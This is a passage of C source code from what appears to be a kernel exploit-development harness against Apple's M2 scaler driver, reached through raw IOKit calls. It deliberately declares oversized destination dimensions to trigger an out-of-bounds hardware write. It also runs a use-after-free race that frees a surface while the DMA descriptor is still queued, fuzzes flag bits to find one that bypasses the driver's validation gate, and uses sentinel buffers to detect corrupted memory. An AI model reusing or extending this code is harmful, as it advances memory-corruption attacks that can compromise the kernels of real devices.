        if (csSt != 0 || !cs) return (int)csSt;
        CVPixelBufferRef pb = NULL;
        CVReturn cr = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &pb);
        if (cr != 0 || !pb) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return (int)cr; }
        ds_m2_fill(pb, tag);
        OSStatus b = VTCompressionSessionPrepareToEncodeFrames(cs);
        for (int f = 0; b == 0 && f < 2; f++)
            b = VTCompressionSessionEncodeFrame(cs, pb, CMTimeMake(f, 600), CMTimeMake(1, 600), NULL, NULL, NULL);
        if (b == 0) b = VTCompressionSessionCompleteFrames(cs, kCMTimeInvalid);
        CVBufferRelease(pb);
        csOut = cs;
        return (int)b;
    }, &es, 15000);
    double tMs = ds_ave_elapsed_ms(t0);
    if (sig == SIGALRM) { g_opt_conn_poisoned = 1; dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (15s)\n", pfx, tag); }
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] sig=%d CLIENT-FAULT @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    if (csOut) ds_opt_teardown(pfx, tag, csOut);
    if (sig == 0) {
        unsigned long df = (unsigned long)g_ave_cb_fires - f0;
        unsigned long dO = (unsigned long)g_ave_cb_ok - o0;
        unsigned long dB = (unsigned long)g_ave_cb_bytes - b0;
        dprintf(STDOUT_FILENO, "%s  I[%s] es=%d cb+%lu ok+%lu B+%lu t=%.0fms (ACCEPT = the daemon still rides CPU; the kernel log decides)\n",
                pfx, tag, es, df, dO, dB, tMs);
        if (dO == 0) { usleep(12000000); }
    }
    ds_journal_write("DONE", stag);
    usleep(80000);
}

/* ------------------------------------------------------------------ */
/* M2K - the RAW sel1 struct cells: the userspace wrapper BYPASSED.    */
/* The connect struct = the prepare descriptor (0x1b0 of the 0x1e0):   */
/*   +0x00 srcID +0x04 dstID +0x20 flags(u64) +0x48 srcW +0x4c srcH    */
/*   +0x70 dstW +0x74 dstH (W=GetWidth 08b0, H=GetHeight 0890).        */
/* The gate reads THESE declared dims; if the HW programs from them    */
/* too, lie-big + alloc-small = the OOB write.                         */
/* ------------------------------------------------------------------ */
static void ds_m2_kcell(const char *pfx, const char *tag, const char *note,
                        int sw, int sh, int dw, int dh,          /* the STRUCT dims */
                        int realDH, uint64_t flags)             /* the REAL dst height */
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] %s | struct src=%dx%d dst=%dx%d REAL-dst=%dx%d flags=%llx\n",
            pfx, tag, note, sw, sh, dw, dh, dw, realDH, (unsigned long long)flags);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }

    /* the direct conn (fresh open per cell - the selmap path) */
    void *k = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!k) { ds_journal_write("DONE", "M2 dlopen-fail"); return; }
    ds_m2_pMatch pM = (ds_m2_pMatch)dlsym(k, "IOServiceMatching");
    ds_m2_pGet1 pG1 = (ds_m2_pGet1)dlsym(k, "IOServiceGetMatchingService");
    ds_m2_pOpen pO = (ds_m2_pOpen)dlsym(k, "IOServiceOpen");
    ds_m2_pClose pC = (ds_m2_pClose)dlsym(k, "IOServiceClose");
    ds_m2_pRelease pR = (ds_m2_pRelease)dlsym(k, "IOObjectRelease");
    ds_m2_pStruct pS = (ds_m2_pStruct)dlsym(k, "IOConnectCallStructMethod");
    if (!pM || !pG1 || !pO || !pS) { ds_journal_write("DONE", "M2 dlsym-fail"); return; }
    CFMutableDictionaryRef m = pM("AppleM2ScalerCSCDriver");
    ds_m2_io_obj_t svc = m ? pG1(0, m) : MACH_PORT_NULL;
    ds_m2_io_obj_t conn = MACH_PORT_NULL;
    if (!svc || pO(svc, mach_task_self(), 0, &conn) != 0 || conn == MACH_PORT_NULL) {
        dprintf(STDOUT_FILENO, "%s  I[%s] open FAILED\n", pfx, tag);
        if (svc) pR(svc);
        ds_journal_write("DONE", "M2 open-fail");
        return;
    }
    CVPixelBufferRef s = NULL, d = NULL;
    CVReturn cr1 = ds_m2_make_pb(sw, sh, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn cr2 = ds_m2_make_pb(dw, realDH, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    if (cr1 != 0 || cr2 != 0 || !s || !d) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surface create FAILED cr1=%d cr2=%d\n", pfx, tag, cr1, cr2);
        if (s) CVBufferRelease(s);
        if (d) CVBufferRelease(d);
        pC(conn); pR(svc);
        ds_journal_write("DONE", "M2 pb-fail");
        return;
    }
    ds_m2_fill(s, tag);
    ds_m2_fill(d, tag);
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(s);
    IOSurfaceRef dIos = CVPixelBufferGetIOSurface(d);
    uint32_t sid = IOSurfaceGetID(sIos), did = IOSurfaceGetID(dIos);
    dprintf(STDOUT_FILENO, "  I[%s] srcIOS=%p id=%u dstIOS=%p id=%u\n", tag,
            (void *)sIos, sid, (void *)dIos, did);

    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    static uint8_t stb[0x1b0];
    sig = ds_ave_guard_run_tmo(^int {
        memset(stb, 0, sizeof(stb));
        *(uint32_t *)(stb + 0x00) = sid;
        *(uint32_t *)(stb + 0x04) = did;
        *(uint64_t *)(stb + 0x20) = flags;
        *(uint32_t *)(stb + 0x48) = (uint32_t)sw;   /* declared src W */
        *(uint32_t *)(stb + 0x4c) = (uint32_t)sh;   /* declared src H */
        *(uint32_t *)(stb + 0x70) = (uint32_t)dw;   /* declared dst W */
        *(uint32_t *)(stb + 0x74) = (uint32_t)dh;   /* declared dst H - THE LIE */
        kr = pS(conn, 1, stb, sizeof(stb), NULL, NULL);
        return 0;
    }, &rc, 8000);
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (8s) = HW RUNNING THE LIE?\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else dprintf(STDOUT_FILENO, "%s  I[%s] sel1 struct kr=%s (%d) %s\n", pfx, tag, ds_m2_kr(kr), kr,
                 (dh <= 32 && sw > 128) ? "<- declared-tiny (gate should fire on the STRUCT)" :
                 (realDH <= 32 && dh > 32) ? "<- LIE-BIG + REAL-SMALL (the OOB shot)" : "");
    CVBufferRelease(s);
    CVBufferRelease(d);
    pC(conn);
    pR(svc);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* M2C1 - THE CORRUPTION WITNESS: sentinel surfaces A/B/C around the   */
/* tiny dst; WithSwap the corruption config into B; diff A/B/C vs the  */
/* 0x41 fill. A/C changes = THE OOB WRITE PROVEN + the shape.          */
/* ------------------------------------------------------------------ */
static long ds_m2_diff_pb(CVPixelBufferRef pb, const char *name, const char *pfx,
                          long *firstOff, long *lastOff)
{
    long diffs = 0;
    *firstOff = -1; *lastOff = -1;
    if (CVPixelBufferLockBaseAddress(pb, 2) != 0) {   /* kCVPixelBufferLock_ReadOnly */
        dprintf(STDOUT_FILENO, "%s  I[%s] %s LOCK-RO FAILED\n", pfx, "M2C1", name);
        return -1;
    }
    size_t npl = CVPixelBufferGetPlaneCount(pb);
    long base = 0;
    for (size_t p = 0; p < (npl ? npl : 1); p++) {
        uint8_t *b = npl ? (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, p)
                         : (uint8_t *)CVPixelBufferGetBaseAddress(pb);
        size_t rowb = npl ? CVPixelBufferGetBytesPerRowOfPlane(pb, p) : CVPixelBufferGetBytesPerRow(pb);
        size_t h = npl ? CVPixelBufferGetHeightOfPlane(pb, p) : CVPixelBufferGetHeight(pb);
        if (!b) continue;
        for (size_t y = 0; y < h; y++)
            for (size_t x = 0; x < rowb; x++) {
                if (b[y * rowb + x] != 0x41) {
                    if (diffs == 0) *firstOff = base + (long)(y * rowb + x);
                    *lastOff = base + (long)(y * rowb + x);
                    diffs++;
                }
            }
        base += (long)(rowb * h);
    }
    CVPixelBufferUnlockBaseAddress(pb, 2);
    dprintf(STDOUT_FILENO, "%s  I[M2C1] %s diffs=%ld first=%ld last=%ld\n", pfx, name, diffs, *firstOff, *lastOff);
    return diffs;
}

static void ds_m2_witness(const char *pfx)
{
    const char *tag = "M2C1";
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] CORRUPTION WITNESS: sentinels A/B/C 1920x32 420v back-to-back, fill 0x41, WithSwap 1080p->B (destH<=32+srcW>128+planes>1), diff vs 0x41\n", pfx, tag);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef sa = NULL, sb = NULL, sc = NULL, src = NULL;
    CVReturn c1 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sa);
    CVReturn c2 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sb);
    CVReturn c3 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sc);
    CVReturn c4 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &src);
    if (c1 || c2 || c3 || c4 || !sa || !sb || !sc || !src) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surface create FAILED (%d %d %d %d)\n", pfx, tag, c1, c2, c3, c4);
        if (sa) CVBufferRelease(sa); if (sb) CVBufferRelease(sb);
        if (sc) CVBufferRelease(sc); if (src) CVBufferRelease(src);
        ds_journal_write("DONE", "M2 pb-fail");
        return;
    }
    ds_m2_fill(sa, tag); ds_m2_fill(sb, tag); ds_m2_fill(sc, tag); ds_m2_fill(src, tag);
    IOSurfaceRef ia = CVPixelBufferGetIOSurface(sa), ib = CVPixelBufferGetIOSurface(sb), ic = CVPixelBufferGetIOSurface(sc);
    dprintf(STDOUT_FILENO, "  I[%s] A ios=%p id=%u | B ios=%p id=%u | C ios=%p id=%u\n", tag,
            (void *)ia, ia ? IOSurfaceGetID(ia) : 0, (void *)ib, ib ? IOSurfaceGetID(ib) : 0,
            (void *)ic, ic ? IOSurfaceGetID(ic) : 0);
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(src), dIos = ib;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    static uint8_t out8[256];
    memset(out8, 0, sizeof(out8));
    uint64_t t0 = mach_absolute_time();
    sig = ds_ave_guard_run_tmo(^int {
        kr = ds_m2_pswap(ds_m2_acc, sIos, dIos, NULL, out8, out8 + 64, out8 + 128, out8 + 192);
        return 0;
    }, &rc, 8000);
    double tMs = ds_ave_elapsed_ms(t0);
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] WithSwap TIMEOUT (8s) - the HW is grinding\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] WithSwap CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else dprintf(STDOUT_FILENO, "%s  I[%s] WithSwap kr=%s (%d) t=%.0fms\n", pfx, tag, ds_m2_kr(kr), kr, tMs);
    /* the readback diff - the OOB oracle */
    long fa = -1, la = -1, fb = -1, lb = -1, fc = -1, lc = -1;
    long da = ds_m2_diff_pb(sa, "A(pre)", pfx, &fa, &la);
    long db = ds_m2_diff_pb(sb, "B(dst)", pfx, &fb, &lb);
    long dc = ds_m2_diff_pb(sc, "C(post)", pfx, &fc, &lc);
    if (da > 0 || dc > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] *** OOB WRITE PROVEN: sentinel A/C modified outside the transfer (A=%ld B=%ld C=%ld) = THE 64747 WRITE SURFACE ***\n", pfx, tag, da, db, dc);
    else if (db > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] dst-only changes (B=%ld) = the HW wrote the dst cleanly - no OOB witness at the neighbors\n", pfx, tag, db);
    else
        dprintf(STDOUT_FILENO, "%s  I[%s] NO changes anywhere (A=%ld B=%ld C=%ld) = the transfer was a no-op or the swap wrote elsewhere\n", pfx, tag, da, db, dc);
    CVBufferRelease(sa); CVBufferRelease(sb); CVBufferRelease(sc); CVBufferRelease(src);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* v169 - THE ASYNC-EXECUTION ROUND (the Gemini model, made testable): */
/*  the v168 witness read at +0ms and saw NOTHING = either a queued    */
/*  no-op OR a DMA race. These cells decide with DELAYED readbacks,    */
/*  an abort-flush arm, the flags sweep, and the release-while-queued  */
/*  UAF race (whose churn makes the stale DMA OBSERVABLE in a live     */
/*  surface even without a panic).                                     */
/* ------------------------------------------------------------------ */

/* M2X1/M2X2 - the EXECUTION ORACLE: same-size 1080p transfer with src=0x42
 * into a 0x41 dst; DELAYED diff. dst flips to 0x42 = the path EXECUTES. */
static void ds_m2_exec_test(const char *pfx, const char *tag, int raw, uint64_t flags, int delayMs)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] EXEC ORACLE %s: same-size 1080p, src fill 0x42 dst fill 0x41, delayed diff +%dms\n",
            pfx, tag, raw ? "RAW-sel1" : "TransferSurface", delayMs);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef s = NULL, d = NULL;
    long fb = -1, lb = -1, db = 0;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    CVReturn c1 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn c2 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    if (c1 || c2 || !s || !d) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surfaces FAILED\n", pfx, tag);
        if (s) CVBufferRelease(s); if (d) CVBufferRelease(d);
        ds_journal_write("DONE", "M2 pb-fail"); return;
    }
    ds_m2_fillv(s, tag, 0x42);
    ds_m2_fillv(d, tag, 0x41);
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(s), dIos = CVPixelBufferGetIOSurface(d);
    if (!raw) {
        sig = ds_ave_guard_run_tmo(^int { kr = ds_m2_pxfer(ds_m2_acc, sIos, dIos, NULL); return 0; }, &rc, 8000);
    } else {
        void *kk = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        ds_m2_pStruct pS = kk ? (ds_m2_pStruct)dlsym(kk, "IOConnectCallStructMethod") : NULL;
        ds_m2_pMatch pM = kk ? (ds_m2_pMatch)dlsym(kk, "IOServiceMatching") : NULL;
        ds_m2_pGet1 pG1 = kk ? (ds_m2_pGet1)dlsym(kk, "IOServiceGetMatchingService") : NULL;
        ds_m2_pOpen pO = kk ? (ds_m2_pOpen)dlsym(kk, "IOServiceOpen") : NULL;
        ds_m2_pClose pC = kk ? (ds_m2_pClose)dlsym(kk, "IOServiceClose") : NULL;
        ds_m2_pRelease pR = kk ? (ds_m2_pRelease)dlsym(kk, "IOObjectRelease") : NULL;
        if (!pS || !pM || !pG1 || !pO) { dprintf(STDOUT_FILENO, "%s  I[%s] IOKit load FAIL\n", pfx, tag); goto out; }
        CFMutableDictionaryRef m = pM("AppleM2ScalerCSCDriver");
        ds_m2_io_obj_t svc = m ? pG1(0, m) : MACH_PORT_NULL;
        ds_m2_io_obj_t conn = MACH_PORT_NULL;
        if (!svc || pO(svc, mach_task_self(), 0, &conn) != 0) { dprintf(STDOUT_FILENO, "%s  I[%s] open FAIL\n", pfx, tag); if (svc) pR(svc); goto out; }
        static uint8_t stb[0x1b0];
        uint32_t sid = IOSurfaceGetID(sIos), did = IOSurfaceGetID(dIos);
        sig = ds_ave_guard_run_tmo(^int {
            memset(stb, 0, sizeof(stb));
            *(uint32_t *)(stb + 0x00) = sid; *(uint32_t *)(stb + 0x04) = did;
            *(uint64_t *)(stb + 0x20) = flags;
            *(uint32_t *)(stb + 0x48) = 1920; *(uint32_t *)(stb + 0x4c) = 1080;
            *(uint32_t *)(stb + 0x70) = 1920; *(uint32_t *)(stb + 0x74) = 1080;
            kr = pS(conn, 1, stb, sizeof(stb), NULL, NULL);
            return 0;
        }, &rc, 8000);
        pC(conn); pR(svc);
    }
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] submit TIMEOUT\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] submit CLIENT-FAULT sig=%d\n", pfx, tag, sig);
    else dprintf(STDOUT_FILENO, "%s  I[%s] submit kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
    usleep(delayMs * 1000);
    db = ds_m2_diff_pb(d, "dst", pfx, &fb, &lb);
    if (db > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] *** dst CHANGED (%ld bytes, first=%ld) = THE PATH EXECUTES (async DMA confirmed) ***\n", pfx, tag, db, fb);
    else
        dprintf(STDOUT_FILENO, "%s  I[%s] dst UNCHANGED after %dms = QUEUED-NOOP (the path does not execute transfers)\n", pfx, tag, delayMs);
out:
    CVBufferRelease(s);
    CVBufferRelease(d);
    ds_journal_write("DONE", stag);
}

/* M2X3/M2X4 - the corruption witness with a DELAYED readback (sentinels
 * kept ALIVE across the wait) + optional AbortTransfers flush arm. */
static void ds_m2_corrupt_delayed(const char *pfx, const char *tag, int doAbort, int delayMs)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] DELAYED WITNESS: A/B/C sentinels 0x41, WithSwap 1080p->B (corruption cfg)%s, diff +%dms\n",
            pfx, tag, doAbort ? " + AbortTransfers" : "", delayMs);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef sa = NULL, sb = NULL, sc = NULL, src = NULL;
    CVReturn c1 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sa);
    CVReturn c2 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sb);
    CVReturn c3 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sc);
    CVReturn c4 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &src);
    if (c1 || c2 || c3 || c4 || !sa || !sb || !sc || !src) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surfaces FAILED\n", pfx, tag);
        if (sa) CVBufferRelease(sa); if (sb) CVBufferRelease(sb);
        if (sc) CVBufferRelease(sc); if (src) CVBufferRelease(src);
        ds_journal_write("DONE", "M2 pb-fail"); return;
    }
    ds_m2_fill(sa, tag); ds_m2_fill(sb, tag); ds_m2_fill(sc, tag); ds_m2_fillv(src, tag, 0x42);
    static uint8_t out8[256];
    memset(out8, 0, sizeof(out8));
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    sig = ds_ave_guard_run_tmo(^int {
        kr = ds_m2_pswap(ds_m2_acc, CVPixelBufferGetIOSurface(src), CVPixelBufferGetIOSurface(sb),
                         NULL, out8, out8 + 64, out8 + 128, out8 + 192);
        return 0;
    }, &rc, 8000);
    dprintf(STDOUT_FILENO, "%s  I[%s] WithSwap kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
    if (doAbort && ds_m2_pabort && kr == 0) {
        __block kern_return_t ka = -1;
        int s2 = ds_ave_guard_run_tmo(^int { ka = ds_m2_pabort(ds_m2_acc); return 0; }, &rc, 4000);
        dprintf(STDOUT_FILENO, "%s  I[%s] AbortTransfers kr=%s (%d) sig=%d\n", pfx, tag, ds_m2_kr(ka), ka, s2);
    }
    usleep(delayMs * 1000);
    long fa, la, fb, lb, fc, lc;
    long da = ds_m2_diff_pb(sa, "A(pre)", pfx, &fa, &la);
    long db = ds_m2_diff_pb(sb, "B(dst)", pfx, &fb, &lb);
    long dc = ds_m2_diff_pb(sc, "C(post)", pfx, &fc, &lc);
    if (da > 0 || dc > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] *** OOB WRITE PROVEN (A=%ld C=%ld) = THE 64747 WRITE SURFACE ***\n", pfx, tag, da, dc);
    else if (db > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] dst changed (%ld bytes) = the transfer EXECUTED cleanly - no OOB witness\n", pfx, tag, db);
    else
        dprintf(STDOUT_FILENO, "%s  I[%s] NOTHING changed after %dms = the queue never flushed (the commit trigger is still missing)\n", pfx, tag, delayMs);
    CVBufferRelease(sa); CVBufferRelease(sb); CVBufferRelease(sc); CVBufferRelease(src);
    ds_journal_write("DONE", stag);
}

/* M2X6 - THE GEMINI RACE: WithSwap the corruption config -> release the
 * dst surface IMMEDIATELY (pages freed/reused while the ring holds the
 * descriptor) -> churn same-size surfaces -> scan them + the sentinels.
 * A stale DMA write into a reused surface = the corruption OBSERVABLE. */
static void ds_m2_race_cell(const char *pfx, int iter)
{
    char tag[16];
    snprintf(tag, sizeof(tag), "M2X6-%d", iter);
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] UAF RACE: WithSwap corruption cfg -> CFRelease(dst) NOW -> churn x4 -> scan (PANIC = THE 64747 WRITE)\n", pfx, tag);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef sa = NULL, sb = NULL, sc = NULL, src = NULL;
    CVPixelBufferRef churn[4] = { NULL, NULL, NULL, NULL };
    long fa = 0, la = 0, fc = 0, lc = 0, da = 0, dc = 0, tot = 0, fd = 0, ld = 0, dd = 0;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    static uint8_t out8[256];
    memset(out8, 0, sizeof(out8));
    CVReturn c1 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sa);
    CVReturn c2 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sb);
    CVReturn c3 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sc);
    CVReturn c4 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &src);
    if (c1 || c2 || c3 || c4 || !sa || !sb || !sc || !src) goto out;
    ds_m2_fill(sa, tag); ds_m2_fill(sb, tag); ds_m2_fill(sc, tag); ds_m2_fillv(src, tag, 0x42);
    sig = ds_ave_guard_run_tmo(^int {
        kr = ds_m2_pswap(ds_m2_acc, CVPixelBufferGetIOSurface(src), CVPixelBufferGetIOSurface(sb),
                         NULL, out8, out8 + 64, out8 + 128, out8 + 192);
        return 0;
    }, &rc, 8000);
    dprintf(STDOUT_FILENO, "%s  I[%s] WithSwap kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
    if (kr != 0) goto out;
    /* THE RACE: free the dst the instant the descriptor is queued */
    CVBufferRelease(sb); sb = NULL;
    for (int i = 0; i < 4; i++) {
        if (ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &churn[i]) == 0 && churn[i])
            ds_m2_fill(churn[i], tag);
    }
    usleep(2000000);
    da = ds_m2_diff_pb(sa, "A(pre)", pfx, &fa, &la);
    dc = ds_m2_diff_pb(sc, "C(post)", pfx, &fc, &lc);
    tot = da + dc;
    for (int i = 0; i < 4; i++) {
        if (!churn[i]) continue;
        char nm[16];
        snprintf(nm, sizeof(nm), "D%d", i);
        dd = ds_m2_diff_pb(churn[i], nm, pfx, &fd, &ld);
        tot += dd;
    }
    if (tot > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] *** STALE-DMA CORRUPTION OBSERVABLE (total=%ld) = the freed dst pages WERE written post-release ***\n", pfx, tag, tot);
    else
        dprintf(STDOUT_FILENO, "%s  I[%s] no stale writes seen (queue flushed cleanly or never ran)\n", pfx, tag);
out:
    if (sa) CVBufferRelease(sa);
    if (sb) CVBufferRelease(sb);
    if (sc) CVBufferRelease(sc);
    if (src) CVBufferRelease(src);
    for (int i = 0; i < 4; i++) if (churn[i]) CVBufferRelease(churn[i]);
    ds_journal_write("DONE", stag);
}

/* M2X5 - the flags-bit sweep on the RAW sel1 corruption config (honest
 * struct=real=1920x32): any SUCCESS = a gate-skipping flag -> immediate
 * delayed witness with it. */
static void ds_m2_flag_sweep(const char *pfx)
{
    static const uint64_t bits[] = { 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000,
                                     0x4000, 0x8000, 0x10000, 0x40000, 0x8000000ULL,
                                     0x40000000ULL, 0x80000000ULL };
    dprintf(STDOUT_FILENO, "%s  I[M2X5] FLAGS SWEEP: raw sel1, honest corruption config (1920x1080 -> 1920x32), flags=0x2000|bit\n", pfx);
    uint64_t winner = 0;
    for (size_t i = 0; i < sizeof(bits) / sizeof(bits[0]); i++) {
        char t2[24];
        snprintf(t2, sizeof(t2), "M2X5-%02zu", i);
        char stag[48];
        snprintf(stag, sizeof(stag), "M2 %s", t2);
        ds_journal_write("START", stag);
        if (ds_m2_ensure_acc(pfx, t2) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
        CVPixelBufferRef s = NULL, d = NULL;
        if (ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s) != 0 ||
            ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d) != 0 || !s || !d) {
            if (s) CVBufferRelease(s); if (d) CVBufferRelease(d);
            ds_journal_write("DONE", "M2 pb-fail"); return;
        }
        uint64_t fl = 0x2000ULL | bits[i];
        void *kk = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        ds_m2_pStruct pS = kk ? (ds_m2_pStruct)dlsym(kk, "IOConnectCallStructMethod") : NULL;
        ds_m2_pMatch pM = kk ? (ds_m2_pMatch)dlsym(kk, "IOServiceMatching") : NULL;
        ds_m2_pGet1 pG1 = kk ? (ds_m2_pGet1)dlsym(kk, "IOServiceGetMatchingService") : NULL;
        ds_m2_pOpen pO = kk ? (ds_m2_pOpen)dlsym(kk, "IOServiceOpen") : NULL;
        ds_m2_pClose pC = kk ? (ds_m2_pClose)dlsym(kk, "IOServiceClose") : NULL;
        ds_m2_pRelease pR = kk ? (ds_m2_pRelease)dlsym(kk, "IOObjectRelease") : NULL;
        kern_return_t kr = -1;
        if (pS && pM && pG1 && pO) {
            CFMutableDictionaryRef m = pM("AppleM2ScalerCSCDriver");
            ds_m2_io_obj_t svc = m ? pG1(0, m) : MACH_PORT_NULL;
            ds_m2_io_obj_t conn = MACH_PORT_NULL;
            if (svc && pO(svc, mach_task_self(), 0, &conn) == 0 && conn != MACH_PORT_NULL) {
                static uint8_t stb[0x1b0];
                uint32_t sid = IOSurfaceGetID(CVPixelBufferGetIOSurface(s));
                uint32_t did = IOSurfaceGetID(CVPixelBufferGetIOSurface(d));
                int sig = 0, rc = 0;
                __block kern_return_t k2 = -1;
                sig = ds_ave_guard_run_tmo(^int {
                    memset(stb, 0, sizeof(stb));
                    *(uint32_t *)(stb + 0x00) = sid; *(uint32_t *)(stb + 0x04) = did;
                    *(uint64_t *)(stb + 0x20) = fl;
                    *(uint32_t *)(stb + 0x48) = 1920; *(uint32_t *)(stb + 0x4c) = 1080;
                    *(uint32_t *)(stb + 0x70) = 1920; *(uint32_t *)(stb + 0x74) = 32;
                    k2 = pS(conn, 1, stb, sizeof(stb), NULL, NULL);
                    return 0;
                }, &rc, 4000);
                if (sig == 0) kr = k2;
                if (sig == 0 && k2 == 0) winner = fl;
                pC(conn);
            }
            if (svc) pR(svc);
        }
        dprintf(STDOUT_FILENO, "%s  I[M2X5] flags=%llx kr=%s (%d)%s\n", pfx,
                (unsigned long long)fl, ds_m2_kr(kr), kr, winner == fl ? " <<< WINNER" : "");
        CVBufferRelease(s);
        CVBufferRelease(d);
        ds_journal_write("DONE", stag);
    }
    if (winner)
        dprintf(STDOUT_FILENO, "%s  I[M2X5] *** WINNER flags=%llx = the gate-skip flag - fire the witness next ***\n", pfx, (unsigned long long)winner);
    else
        dprintf(STDOUT_FILENO, "%s  I[M2X5] no flag bypassed the gate\n", pfx);
}

/* ------------------------------------------------------------------ */
/* v170 - THE MODE-WORD FUZZ: the wrapper's struct carries w22 in {0,1,2} */
/* at struct+0x2c (the transform type); the gate-rejecting D2 rode 1, our */
/* raw K-cells rode 0. The honest corruption config at +0x2c=0 with flags */
/* 0x2000 has NEVER been fired. Plus the src/dst format-plane matrix.     */
/* ------------------------------------------------------------------ */

/* the raw sel1 cell with the +0x2c mode word + a dst-diff execution witness */
static void ds_m2_kmode_cell(const char *pfx, const char *tag, const char *note,
                             uint32_t w2c, uint32_t w28, uint64_t flags,
                             int dw, int dh, int realDH)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] %s | +0x2c=%u +0x28=%u flags=%llx struct-dst=%dx%d REAL-dst=%dx%d\n",
